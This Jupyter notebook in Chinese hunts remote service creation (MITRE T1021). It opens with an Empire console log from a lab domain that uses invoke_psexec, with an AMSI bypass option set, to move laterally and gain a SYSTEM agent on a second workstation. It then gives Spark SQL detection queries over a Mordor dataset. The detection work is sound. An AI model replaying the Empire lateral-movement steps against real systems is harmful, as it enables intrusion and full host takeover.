{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 远程服务创建（Remote Service creation）"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 概述"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```\n",
    "———————————————————————————\n",
    "|  编写作者  |    G4rb3n   |\n",
    "---------------------------\n",
    "|  攻击矩阵  |    T1021    |  \n",
    "---------------------------\n",
    "|  创建时间  |   2021-2-4  |  \n",
    "---------------------------\n",
    "|  修改时间  |   2021-2-4  |  \n",
    "———————————————————————————\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 攻击场景"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "黑客通过创建远程服务来执行恶意代码，实现横向移动。"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 模拟攻击"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "(Empire: stager/multi/launcher) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "A7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \n",
    "HBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \n",
    "UF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 16:13:06  http            \n",
    "\n",
    "\n",
    "(Empire: agents) > interact UF5MYK42\n",
    "(Empire: UF5MYK42) > usemodule lateral_movement/invoke_psexec\n",
    "(Empire: powershell/lateral_movement/invoke_psexec) > set Listener http\n",
    "(Empire: powershell/lateral_movement/invoke_psexec) > execute\n",
    "(Empire: powershell/lateral_movement/invoke_psexec) > set ComputerName WORKSTATION6.theshire.local\n",
    "(Empire: powershell/lateral_movement/invoke_psexec) > info\n",
    "\n",
    "              Name: Invoke-PsExec\n",
    "            Module: powershell/lateral_movement/invoke_psexec\n",
    "        NeedsAdmin: False\n",
    "        OpsecSafe: False\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: True\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @harmj0y\n",
    "\n",
    "Description:\n",
    "  Executes a stager on remote hosts using PsExec type\n",
    "  functionality.\n",
    "\n",
    "Comments:\n",
    "  https://github.com/rapid7/metasploit-\n",
    "  framework/blob/master/tools/psexec.rb\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name             Required    Value                     Description\n",
    "  ----             --------    -------                   -----------\n",
    "  Agent            True        UF5MYK42                  Agent to run module on.                 \n",
    "  Listener         False                                 Listener to use.                        \n",
    "  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n",
    "                                                        powershell code, uses the               \n",
    "                                                        ObfuscateCommand for obfuscation types. \n",
    "                                                        For powershell only.                    \n",
    "  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n",
    "                                                        Only used if Obfuscate switch is True.  \n",
    "                                                        For powershell only.                    \n",
    "  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n",
    "                                                        the stager code.                        \n",
    "  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n",
    "                                                        the stager code.                        \n",
    "  ComputerName     True        ComputerName WORKSTATION6.theshire.local Host to execute the stager on.          \n",
    "  ServiceName      True        Updater                   The name of the service to create.      \n",
    "  Command          False                                 Custom command to execute on remote     \n",
    "                                                        hosts.                                  \n",
    "  ResultFile       False                                 Name of the file to write the results to\n",
    "                                                        on agent machine.                       \n",
    "  UserAgent        False       default                   User-agent string to use for the staging\n",
    "                                                        request (default, none, or other).      \n",
    "  Proxy            False       default                   Proxy to use for request (default, none,\n",
    "                                                        or other).                              \n",
    "  ProxyCreds       False       default                   Proxy credentials                       \n",
    "                                                        ([domain\\]username:password) to use for \n",
    "                                                        request (default, none, or other).      \n",
    "\n",
    "(Empire: powershell/lateral_movement/invoke_psexec) > execute\n",
    "[>] Module is not opsec safe, run? [y/N] y\n",
    "[*] Tasked UF5MYK42 to run TASK_CMD_JOB\n",
    "[*] Agent UF5MYK42 tasked with task ID 1\n",
    "[*] Tasked agent UF5MYK42 to run module powershell/lateral_movement/invoke_psexec\n",
    "(Empire: powershell/lateral_movement/invoke_psexec) > \n",
    "Job started: RNU5DY\n",
    "\n",
    "[*] Sending POWERSHELL stager (stage 1) to 172.18.39.6\n",
    "\n",
    "[*] New agent 9CMNYX72 checked in\n",
    "[+] Initial agent 9CMNYX72 from 172.18.39.6 now active (Slack)\n",
    "[*] Sending agent (stage 2) to 9CMNYX72 at 172.18.39.6\n",
    "\n",
    "(Empire: powershell/lateral_movement/invoke_psexec) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "A7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \n",
    "HBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \n",
    "UF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 16:17:06  http            \n",
    "\n",
    "9CMNYX72 ps 172.18.39.6     WORKSTATION6      *THESHIRE\\SYSTEM        powershell         4312   5/0.0    2020-09-20 16:17:08  http            \n",
    "\n",
    "(Empire: agents) > interact 9CMNYX72\n",
    "(Empire: 9CMNYX72) > shell whoami\n",
    "[*] Tasked 9CMNYX72 to run TASK_SHELL\n",
    "[*] Agent 9CMNYX72 tasked with task ID 1\n",
    "(Empire: 9CMNYX72) > \n",
    "nt authority\\system\n",
    "\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: 9CMNYX72) > back"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 威胁狩猎"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 狩猎原理"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "搜索登陆类型（logon session）为3，且登录账号为非特权账号的服务创建操作，即为远程服务创建的攻击行为。"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```\n",
    "——————————————————————————————————————————————————————————————————————————\n",
    "|        日志类型        |    日志来源    |       行为场景      |   事件ID  |\n",
    "--------------------------------------------------------------------------\n",
    "|        Service        |    security   |   用户创建了一个服务  |    4697  |\n",
    "--------------------------------------------------------------------------\n",
    "|   Authentication log  |    security   |   用户登陆了一台主机  |    4624  |\n",
    "——————————————————————————————————————————————————————————————————————————\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 初始化分析引擎"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 下载&加载Mordor日志集"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Processing a Spark DataFrame..\n",
      "[+] DataFrame Returned !\n",
      "[+] Temporary SparkSQL View: mordorTable \n"
     ]
    }
   ],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/empire_psexec_dcerpc_tcp_svcctl.zip\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 攻击日志统计"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+---------------------------+----------------------------------------+-------+-----+\n",
      "|Hostname                   |Channel                                 |EventID|count|\n",
      "+---------------------------+----------------------------------------+-------+-----+\n",
      "|WORKSTATION6.theshire.local|Microsoft-Windows-Sysmon/Operational    |10     |1144 |\n",
      "|WORKSTATION6.theshire.local|Microsoft-Windows-Sysmon/Operational    |12     |596  |\n",
      "|WORKSTATION6.theshire.local|Microsoft-Windows-Sysmon/Operational    |7      |351  |\n",
      "|WORKSTATION5.theshire.local|Microsoft-Windows-Sysmon/Operational    |10     |347  |\n",
      "|WORKSTATION5.theshire.local|Windows PowerShell                      |800    |255  |\n",
      "|WORKSTATION6.theshire.local|Microsoft-Windows-Sysmon/Operational    |13     |229  |\n",
      "|WORKSTATION5.theshire.local|Microsoft-Windows-PowerShell/Operational|4103   |224  |\n",
      "|WORKSTATION6               |Windows PowerShell                      |800    |169  |\n",
      "|WORKSTATION6.theshire.local|Microsoft-Windows-PowerShell/Operational|4103   |126  |\n",
      "|WORKSTATION5.theshire.local|Microsoft-Windows-Sysmon/Operational    |12     |122  |\n",
      "|WORKSTATION6.theshire.local|security                                |4658   |111  |\n",
      "|WORKSTATION6.theshire.local|security                                |4656   |58   |\n",
      "|WORKSTATION5.theshire.local|Microsoft-Windows-Sysmon/Operational    |13     |58   |\n",
      "|WORKSTATION6.theshire.local|security                                |4690   |56   |\n",
      "|MORDORDC.theshire.local    |Security                                |5156   |39   |\n",
      "|WORKSTATION6.theshire.local|security                                |4663   |38   |\n",
      "|WORKSTATION6.theshire.local|security                                |5158   |36   |\n",
      "|WORKSTATION6.theshire.local|security                                |4703   |30   |\n",
      "|MORDORDC.theshire.local    |Security                                |5158   |28   |\n",
      "|WORKSTATION5.theshire.local|Security                                |5158   |27   |\n",
      "+---------------------------+----------------------------------------+-------+-----+\n",
      "only showing top 20 rows\n",
      "\n"
     ]
    }
   ],
   "source": [
    "df = spark.sql(\n",
    "'''\n",
    "SELECT Hostname,Channel,EventID, Count(*) as count\n",
    "FROM mordorTable\n",
    "GROUP BY Hostname,Channel,EventID\n",
    "ORDER BY count DESC\n",
    "'''\n",
    ")\n",
    "df.show(truncate=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 使用规则匹配攻击日志"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "筛选事件ID为4624（Authentication log）的事件"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+------------------------+---------------------------+---------------+-----------+-----------+-----------+\n",
      "|@timestamp              |Hostname                   |SubjectUserName|ServiceName|ProcessName|IpAddress  |\n",
      "+------------------------+---------------------------+---------------+-----------+-----------+-----------+\n",
      "|2020-09-20T16:16:58.212Z|WORKSTATION6.theshire.local|-              |null       |-          |172.18.39.5|\n",
      "+------------------------+---------------------------+---------------+-----------+-----------+-----------+\n",
      "\n"
     ]
    }
   ],
   "source": [
    "df = spark.sql(\n",
    "'''\n",
    "SELECT `@timestamp`, Hostname, SubjectUserName, ServiceName, ProcessName, IpAddress\n",
    "    FROM mordorTable\n",
    "    WHERE Channel = \"security\"\n",
    "        AND EventID = 4624\n",
    "'''\n",
    ")\n",
    "df.show(20, False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "筛选事件ID为4624，且登录类型为3的事件"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+------------------------+---------------------------+---------------+-----------+-----------+-----------+\n",
      "|@timestamp              |Hostname                   |SubjectUserName|ServiceName|ProcessName|IpAddress  |\n",
      "+------------------------+---------------------------+---------------+-----------+-----------+-----------+\n",
      "|2020-09-20T16:16:58.212Z|WORKSTATION6.theshire.local|-              |null       |-          |172.18.39.5|\n",
      "+------------------------+---------------------------+---------------+-----------+-----------+-----------+\n",
      "\n"
     ]
    }
   ],
   "source": [
    "df = spark.sql(\n",
    "'''\n",
    "SELECT `@timestamp`, Hostname, SubjectUserName, ServiceName, ProcessName, IpAddress\n",
    "    FROM mordorTable\n",
    "    WHERE Channel = \"security\"\n",
    "        AND EventID = 4624\n",
    "        AND LogonType = 3\n",
    "'''\n",
    ")\n",
    "df.show(20, False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "筛选事件ID为4624，登录类型为3，且登陆用户名为非特权账号的事件"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+------------------------+---------------------------+---------------+-----------+-----------+-----------+\n",
      "|@timestamp              |Hostname                   |SubjectUserName|ServiceName|ProcessName|IpAddress  |\n",
      "+------------------------+---------------------------+---------------+-----------+-----------+-----------+\n",
      "|2020-09-20T16:16:58.212Z|WORKSTATION6.theshire.local|-              |null       |-          |172.18.39.5|\n",
      "+------------------------+---------------------------+---------------+-----------+-----------+-----------+\n",
      "\n"
     ]
    }
   ],
   "source": [
    "df = spark.sql(\n",
    "'''\n",
    "SELECT `@timestamp`, Hostname, SubjectUserName, ServiceName, ProcessName, IpAddress\n",
    "    FROM mordorTable\n",
    "    WHERE Channel = \"security\"\n",
    "        AND EventID = 4624\n",
    "        AND LogonType = 3\n",
    "        AND NOT TargetUserName LIKE \"%$\"\n",
    "'''\n",
    ")\n",
    "df.show(20, False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "筛选事件ID为4624，登录类型为3，登陆用户名为非特权账号，且与事件ID4697相关联的事件"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+------------------------+---------------------------+---------------+-----------+-----------+-----------+\n",
      "|@timestamp              |Hostname                   |SubjectUserName|ServiceName|ProcessName|IpAddress  |\n",
      "+------------------------+---------------------------+---------------+-----------+-----------+-----------+\n",
      "|2020-09-20T16:16:58.214Z|WORKSTATION6.theshire.local|pgustavo       |Updater    |-          |172.18.39.5|\n",
      "+------------------------+---------------------------+---------------+-----------+-----------+-----------+\n",
      "\n"
     ]
    }
   ],
   "source": [
    "df = spark.sql(\n",
    "'''\n",
    "SELECT o.`@timestamp`, o.Hostname, o.SubjectUserName, o.ServiceName, a.ProcessName, a.IpAddress\n",
    "FROM mordorTable o\n",
    "INNER JOIN (\n",
    "    SELECT TargetLogonId, ProcessName, IpAddress\n",
    "    FROM mordorTable\n",
    "    WHERE Channel = \"security\"\n",
    "        AND EventID = 4624\n",
    "        AND LogonType = 3            \n",
    "        AND NOT TargetUserName LIKE \"%$\"\n",
    "    ) a\n",
    "ON o.SubjectLogonId = a.TargetLogonId\n",
    "WHERE o.Channel = \"security\"\n",
    "    AND o.EventID = 4697\n",
    "'''\n",
    ")\n",
    "df.show(20, False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "筛选出新创建服务的恶意代码"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+------------------------+---------------------------+---------------+-----------+-----------+-------------------------------------------------------------------------------------+\n",
      "|              @timestamp|                   Hostname|SubjectUserName|ServiceName|  IpAddress|                                                                      ServiceFileName|\n",
      "+------------------------+---------------------------+---------------+-----------+-----------+-------------------------------------------------------------------------------------+\n",
      "|2020-09-20T16:16:58.214Z|WORKSTATION6.theshire.local|       pgustavo|    Updater|172.18.39.5|%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -...|\n",
      "+------------------------+---------------------------+---------------+-----------+-----------+-------------------------------------------------------------------------------------+\n",
      "\n"
     ]
    }
   ],
   "source": [
    "df = spark.sql(\n",
    "'''\n",
    "SELECT o.`@timestamp`, o.Hostname, o.SubjectUserName, o.ServiceName, a.IpAddress, o.ServiceFileName\n",
    "FROM mordorTable o\n",
    "INNER JOIN (\n",
    "    SELECT TargetLogonId, ProcessName, IpAddress\n",
    "    FROM mordorTable\n",
    "    WHERE Channel = \"security\"\n",
    "        AND EventID = 4624\n",
    "        AND LogonType = 3            \n",
    "        AND NOT TargetUserName LIKE \"%$\"\n",
    "    ) a\n",
    "ON o.SubjectLogonId = a.TargetLogonId\n",
    "WHERE o.Channel = \"security\"\n",
    "    AND o.EventID = 4697\n",
    "'''\n",
    ")\n",
    "df.show(20, 85)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
